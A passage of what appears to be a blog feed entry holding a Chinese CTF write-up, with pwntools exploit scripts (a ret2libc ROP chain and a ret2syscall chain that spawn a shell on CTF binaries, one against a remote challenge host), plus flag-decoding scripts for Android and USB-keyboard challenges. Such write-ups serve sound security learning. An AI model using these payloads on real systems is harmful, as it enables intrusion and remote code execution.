class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;58.240.236.231&quot;,49002)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_addr = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;vul&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400783</span></span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400781</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xD8</span> + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;OK,Good!&#x27;)</span></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment">#将其中的前6个字节（因为这里用的是Little Endian字节序）转换成unsigned long long类型的整数，</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">libcsase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>) </span><br><span class="line"></span><br><span class="line">system_addr = libcsase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libcsase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x0000000000400509</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xD8</span> + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><h2 id="HSAndroid1"><a href="#HSAndroid1" class="headerlink" title="HSAndroid1"></a>HSAndroid1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag_chars = <span class="built_in">list</span>(<span class="string">&quot;0db530c0e9752357b1ae4cf7ea8331ae&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, <span class="number">0</span>, -<span class="number">4</span>):</span><br><span class="line">        temp = flag_chars[j]</span><br><span class="line">        flag_chars[j] = flag_chars[j - <span class="number">4</span>]</span><br><span class="line">        flag_chars[j - <span class="number">4</span>] = temp</span><br><span class="line">    j2 = i - <span class="number">1</span></span><br><span class="line">    temp2 = flag_chars[j2]</span><br><span class="line">    flag_chars[i - <span class="number">1</span>] = flag_chars[i - <span class="number">2</span>]</span><br><span class="line">    flag_chars[i - <span class="number">2</span>] = temp2</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag_chars)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure><h2 id="easyusb"><a href="#easyusb" class="headerlink" title="easyusb"></a>easyusb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -T json -r usb.pcapng &gt; test.json </span><br></pre></td></tr></table></figure><p>提取流量包，类似这种格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usbhid.data<span class="string">&quot;: &quot;</span><span class="number">00</span>:<span class="number">00</span>:<span class="number">16</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">16</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">06</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">1f</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">17</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>e:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">20</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">1</span>c:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure><p>然后网上找脚本一把嗦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output :</span></span><br><span class="line"><span class="comment"># SEC2ETK3Y</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ret2syscall&quot;&gt;&lt;a href=&quot;#ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;ret2syscall&quot;&gt;&lt;/a&gt;ret2syscall&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;context(arch=&lt;span class=&quot;string&quot;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;, os=&lt;span class=&quot;string&quot;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;, log_level=&lt;span class=&quot;string&quot;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# p = process(&amp;#x27;pwn&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p = remote(&lt;span class=&quot;string&quot;&gt;&amp;#x27;58.240.236.231&amp;#x27;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;49003&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rdi = &lt;span class=&quot;number&quot;&gt;0x40072b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rsi = &lt;span class=&quot;number&quot;&gt;0x400735&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rax = &lt;span class=&quot;number&quot;&gt;0x400721&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;syscall = &lt;span class=&quot;number&quot;&gt;0x400741&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rdx = &lt;span class=&quot;number&quot;&gt;0x40073f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;binsh = &lt;span class=&quot;number&quot;&gt;0x601048&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = &lt;span class=&quot;number&quot;&gt;0x48&lt;/span&gt;*&lt;span class=&quot;string&quot;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;+ p64(rax) + p64(&lt;span class=&quot;number&quot;&gt;59&lt;/span&gt;) + p64(rdi) + p64(&lt;span class=&quot;number&quot;&gt;0x601048&lt;/span&gt;) + p64(rsi) + p64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) + p64(syscall)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://wuming.github.io/tags/ctf/"/>
    
    <category term="pwn" scheme="https://wuming.github.io/tags/pwn/"/>
    
    <category term="write up" scheme="https://wuming.github.io/tags/write-up/"/>
    
  </entry>
  
</feed>
